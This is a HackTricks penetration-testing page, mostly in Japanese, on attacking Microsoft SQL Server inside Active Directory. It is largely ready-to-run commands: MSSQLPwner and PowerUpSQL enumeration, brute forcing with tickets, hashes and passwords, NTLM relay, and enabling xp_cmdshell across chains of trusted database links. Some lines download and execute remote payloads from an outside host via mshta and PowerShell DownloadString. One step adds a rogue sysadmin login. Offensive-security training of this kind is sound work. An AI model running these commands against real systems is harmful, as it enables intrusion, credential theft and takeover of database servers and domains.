# MSSQL AD Abuse

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## **MSSQL 列挙 / 発見**

### Python

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) ツールは impacket に基づいており、kerberos チケットを使用して認証し、リンクチェーンを通じて攻撃することも可能です。

<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
```shell
# Interactive mode
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

# Interactive mode with 2 depth level of impersonations

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -max-impersonation-depth 2 interactive

# Executing custom assembly on the current server with windows authentication and executing hostname command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate

# Issuing NTLM relay attack on the SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250

# Executing direct query

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"

# Retrieving password from the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password

# Execute code using custom assembly on the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll

# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt

```
### ドメインセッションなしでのネットワークからの列挙
```

# Interactive mode

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

````
---
###  Powershell

この場合、powershellモジュール[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)は非常に便利です。
```powershell
Import-Module .\PowerupSQL.psd1
````
### ドメインセッションなしでのネットワークからの列挙
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### ドメイン内からの列挙
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL 基本的な悪用

### DB へのアクセス
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

MSSQLホスト内で**コマンドを実行**することも可能かもしれません。
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
以下のセクションで手動でこれを行う方法を確認してください。

### MSSQL基本ハッキングテクニック

{{#ref}}
../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
{{#endref}}

## MSSQL信頼されたリンク

MSSQLインスタンスが別のMSSQLインスタンスによって信頼されている場合（データベースリンク）。ユーザーが信頼されたデータベースに対して権限を持っている場合、**信頼関係を利用して他のインスタンスでもクエリを実行できるようになります**。この信頼は連鎖させることができ、ユーザーはコマンドを実行できるような誤って構成されたデータベースを見つけることができるかもしれません。

**データベース間のリンクは、フォレスト信頼を越えても機能します。**

### Powershellの悪用
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

metasploitを使用して、信頼できるリンクを簡単に確認できます。
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
注意してください、metasploitはMSSQLの`openquery()`関数のみを悪用しようとします（したがって、`openquery()`でコマンドを実行できない場合は、コマンドを実行するために`EXECUTE`メソッドを**手動で**試す必要があります。詳細は以下を参照してください。）

### 手動 - Openquery()

**Linux**からは、**sqsh**と**mssqlclient.py**を使用してMSSQLコンソールシェルを取得できます。

**Windows**からも、リンクを見つけて**MSSQLクライアントのような**[**HeidiSQL**](https://www.heidisql.com)を使用してコマンドを手動で実行できます。

_Windows認証を使用してログイン：_

![](<../../images/image (808).png>)

#### 信頼できるリンクを見つける
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![](<../../images/image (716).png>)

#### 信頼できるリンクでクエリを実行する

リンクを通じてクエリを実行します（例：新しいアクセス可能なインスタンスでさらにリンクを見つける）：
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
> [!WARNING]
> ダブルクオートとシングルクオートがどこで使用されているか確認してください。その使い方は重要です。

![](<../../images/image (643).png>)

これらの信頼できるリンクのチェーンを手動で永遠に続けることができます。
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
`openquery()`から`exec xp_cmdshell`のようなアクションを実行できない場合は、`EXECUTE`メソッドを試してください。

### 手動 - EXECUTE

`EXECUTE`を使用して信頼されたリンクを悪用することもできます：
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## ローカル特権昇格

**MSSQLローカルユーザー**は通常、**`SeImpersonatePrivilege`**と呼ばれる特別な種類の特権を持っています。これにより、アカウントは「認証後にクライアントを偽装する」ことができます。

多くの著者が考案した戦略は、攻撃者が作成した悪意のあるまたは中間者サービスにSYSTEMサービスを認証させることです。この悪意のあるサービスは、SYSTEMサービスが認証を試みている間にそれを偽装することができます。

[SweetPotato](https://github.com/CCob/SweetPotato)には、Beaconの`execute-assembly`コマンドを介して実行できるこれらのさまざまな技術のコレクションがあります。

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
